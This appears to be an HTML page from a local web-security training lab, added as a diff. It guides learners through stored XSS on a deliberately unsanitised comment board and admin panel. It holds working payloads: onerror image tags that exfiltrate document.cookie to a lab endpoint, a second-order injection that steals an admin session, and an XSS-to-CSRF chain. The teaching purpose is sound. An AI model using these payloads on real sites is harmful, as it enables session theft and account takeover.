@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Attack 06 — Stored XSS & Second-Order</title>
+  <style>
+    :root{--bg:#0b0f1a;--bg2:#111827;--card:#141c2e;--border:#1e3a5f;
+          --gold:#f5c842;--cyan:#38bdf8;--purple:#a78bfa;--red:#f87171;
+          --green:#4ade80;--orange:#fb923c;--text:#e2e8f0;--muted:#7a9bbf}
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{background:var(--bg);color:var(--text);font-family:-apple-system,sans-serif;padding:32px}
+    .wrap{max-width:860px;margin:0 auto}
+    h1{font-size:28px;color:var(--gold);margin-bottom:6px}
+    .step{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:22px 24px;margin-bottom:16px}
+    .step-header{display:flex;align-items:baseline;gap:12px;margin-bottom:12px}
+    .step-num{background:var(--border);color:var(--cyan);font-size:11px;font-weight:700;
+              width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+    .step-title{font-size:14px;font-weight:700;color:var(--text)}
+    .step p{font-size:13.5px;color:var(--muted);line-height:1.6;margin-bottom:10px}
+    .payload{background:#060d1a;border:1px solid var(--border);border-radius:4px;
+             padding:10px 14px;font-family:'Courier New',monospace;font-size:12.5px;
+             color:var(--orange);margin:8px 0;word-break:break-all}
+    .btn{display:inline-block;padding:8px 16px;border:none;border-radius:4px;cursor:pointer;
+         font-size:13px;font-weight:600;margin:4px 4px 4px 0;text-decoration:none}
+    .btn-fire{background:#4a1515;color:var(--red);border:1px solid var(--red)}
+    .btn-nav{background:var(--bg2);color:var(--cyan);border:1px solid var(--border)}
+    .btn-clear{background:var(--bg2);color:var(--muted);border:1px solid var(--border)}
+    .tag{display:inline-block;font-size:10px;font-weight:700;padding:2px 7px;border-radius:3px;letter-spacing:.08em;margin-bottom:8px}
+    .tag-stored{background:#1a1a0a;color:var(--gold);border:1px solid #5a5010}
+    .tag-second{background:#1a0a2e;color:var(--purple);border:1px solid var(--purple)}
+    .tag-danger{background:#2d0a0a;color:var(--red);border:1px solid var(--red)}
+    .chain{background:#060d1a;border:1px solid var(--border);border-radius:6px;
+           padding:14px 18px;margin:12px 0;font-size:13px;line-height:1.9}
+    .chain-step{display:flex;gap:10px;align-items:flex-start;margin-bottom:4px}
+    .chain-n{background:var(--border);color:var(--cyan);font-size:10px;font-weight:700;
+              width:20px;height:20px;border-radius:50%;display:flex;align-items:center;
+              justify-content:center;flex-shrink:0;margin-top:2px}
+    code{font-family:'Courier New',monospace;font-size:11.5px;background:#060d1a;color:var(--cyan);padding:1px 4px;border-radius:2px}
+    .nav{display:flex;justify-content:space-between;font-size:13px;color:var(--muted);margin-bottom:24px}
+    .nav a{color:var(--cyan);text-decoration:none}
+  </style>
+</head>
+<body>
+<div class="wrap">
+  <nav class="nav">
+    <a href="/">← Lab Home</a>
+    <span>Module 10 — Stored XSS</span>
+    <a href="/board">Comment Board →</a>
+  </nav>
+
+  <h1>Attack 06 — Stored XSS & Second-Order Attacks</h1>
+  <p style="color:var(--muted);font-size:14px;margin-bottom:32px">
+    Payloads that persist across requests, executing for every subsequent visitor —
+    and second-order injection where storage and execution contexts differ.
+  </p>
+
+  <!-- Step 1 -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">1</div>
+      <div class="step-title">Basic Stored XSS — Comment Board</div></div>
+    <span class="tag tag-stored">STORED</span>
+    <span class="tag tag-danger" style="margin-left:4px">EVERY VISITOR</span>
+    <p>
+      Post a comment to the board with a zero-interaction payload. The payload
+      will execute for <em>every user who visits the board</em> — including
+      opening it in a fresh incognito window to simulate a different victim.
+    </p>
+    <div class="chain">
+      <div class="chain-step"><div class="chain-n">1</div><div>Attacker posts comment with onerror payload</div></div>
+      <div class="chain-step"><div class="chain-n">2</div><div>Server stores raw HTML in memory (no sanitisation)</div></div>
+      <div class="chain-step"><div class="chain-n">3</div><div>Any visitor to /board receives the payload in the page HTML</div></div>
+      <div class="chain-step"><div class="chain-n">4</div><div>onerror fires in victim's browser — cookie exfiltrated</div></div>
+    </div>
+    <div class="payload">Name: Attacker
+Comment: &lt;img src=x onerror="fetch('/ping?stolen='+btoa(document.cookie))"&gt;</div>
+    <a class="btn btn-fire" href="/board" target="_blank">Open Comment Board</a>
+    <p style="font-size:12px;color:var(--muted);margin-top:8px">
+      Submit the payload via the form. Then open the board in a new incognito window to
+      simulate a different victim visiting — the payload executes again.
+      Check DevTools → Network for the /ping request.
+    </p>
+  </div>
+
+  <!-- Step 2 -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">2</div>
+      <div class="step-title">Author Field Injection — Persistent Identity Hijack</div></div>
+    <span class="tag tag-stored">STORED</span>
+    <p>
+      Both the author name and the comment text are reflected raw. A payload in
+      the author name executes on every comment card render — not just once per page
+      load, but once per comment from that author. Store a zero-interaction payload
+      in the author field with an innocuous-looking text.
+    </p>
+    <div class="payload">Name: &lt;img src=x onerror=alert('author field XSS: '+document.domain)&gt;
+Comment: Great post!</div>
+    <a class="btn btn-fire" href="/board" target="_blank">Open Comment Board</a>
+    <p style="font-size:12px;color:var(--muted);margin-top:8px">
+      If this author posts multiple comments, the payload fires once per card rendered.
+      Submit 3 comments from this author and observe how many times alert fires on page load.
+    </p>
+  </div>
+
+  <!-- Step 3 -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">3</div>
+      <div class="step-title">Second-Order Attack — Profile → Admin Panel</div></div>
+    <span class="tag tag-second">SECOND ORDER</span>
+    <span class="tag tag-danger" style="margin-left:4px">PRIVILEGE ESCALATION</span>
+    <p>
+      The profile registration page (<code>/admin/profile</code>) is public-facing
+      and appears harmless. However, stored profile data is rendered in the admin
+      panel (<code>/admin</code>) without sanitisation. An attacker who registers
+      a malicious profile can execute JavaScript in the admin's browser — achieving
+      privilege escalation from a public user to code execution in an admin session.
+    </p>
+    <div class="chain">
+      <div class="chain-step"><div class="chain-n">1</div><div>Attacker visits public <code>/admin/profile</code> form — no auth required</div></div>
+      <div class="chain-step"><div class="chain-n">2</div><div>Submits payload in the bio or website field</div></div>
+      <div class="chain-step"><div class="chain-n">3</div><div>Admin navigates to <code>/admin</code> to review profiles</div></div>
+      <div class="chain-step"><div class="chain-n">4</div><div>Payload executes in admin's browser — admin session cookie exfiltrated</div></div>
+      <div class="chain-step"><div class="chain-n">5</div><div>Attacker uses stolen admin session to perform privileged actions</div></div>
+    </div>
+    <div class="payload">Username: attacker
+Bio: Researcher &lt;img src=x onerror="fetch('/ping?admin_cookie='+btoa(document.cookie))"&gt;
+Website: https://example.com</div>
+    <a class="btn btn-fire" href="/admin/profile" target="_blank">Open Profile Form</a>
+    <a class="btn btn-nav" href="/admin" target="_blank">Open Admin Panel</a>
+    <p style="font-size:12px;color:var(--muted);margin-top:8px">
+      Submit the payload via the profile form, then open the admin panel.
+      The admin panel's /ping request should appear with the cookie value.
+    </p>
+  </div>
+
+  <!-- Step 4 -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">4</div>
+      <div class="step-title">Stored XSS → CSRF: Admin Action Without Credentials</div></div>
+    <span class="tag tag-second">CHAINED ATTACK</span>
+    <p>
+      XSS in an admin panel can be used to perform CSRF — making authenticated
+      requests as the admin without knowing the admin's password. The stored
+      payload below, when executed in the admin's browser, sends a POST request
+      to the clear endpoint (simulating a destructive admin action) and
+      exfiltrates confirmation.
+    </p>
+    <div class="payload">Bio: &lt;img src=x onerror="
+  fetch('/board/clear', {method:'GET', credentials:'include'})
+    .then(()=&gt;fetch('/ping?action=board_cleared'))
+"&gt;</div>
+    <a class="btn btn-fire" href="/admin/profile" target="_blank">Submit XSS→CSRF payload</a>
+    <a class="btn btn-nav" href="/admin" target="_blank">Trigger in Admin Panel</a>
+    <a class="btn btn-clear" href="/board/clear">Reset Board</a>
+  </div>
+
+  <!-- Step 5 -->
+  <div class="step">
+    <div class="step-header"><div class="step-num">5</div>
+      <div class="step-title">Dwell Time: Payload Persists Across Server Restarts</div></div>
+    <span class="tag tag-stored">STORED</span>
+    <p>
+      In this lab the store is in-memory (resets on restart). In a real application
+      with a database, a stored XSS payload persists until:
+    </p>
+    <ul style="font-size:13.5px;color:var(--muted);padding-left:20px;line-height:2">
+      <li>A developer manually removes the malicious record</li>
+      <li>An automated scanner detects and removes it</li>
+      <li>The field is sanitised retroactively (rare — usually requires a migration)</li>
+    </ul>
+    <p style="font-size:13.5px;color:var(--muted)">
+      This dwell time — potentially months or years — is what makes stored XSS the
+      highest-impact XSS variant. A single payload can run in thousands of victim
+      browsers before it's discovered. Research has documented stored XSS payloads
+      active in production systems for 18+ months.
+    </p>
+    <a class="btn btn-clear" href="/board/clear">Clear board</a>
+    <a class="btn btn-clear" href="/admin/clear" style="margin-left:4px">Clear profiles</a>
+  </div>
+
+</div>
+</body>
+</html>
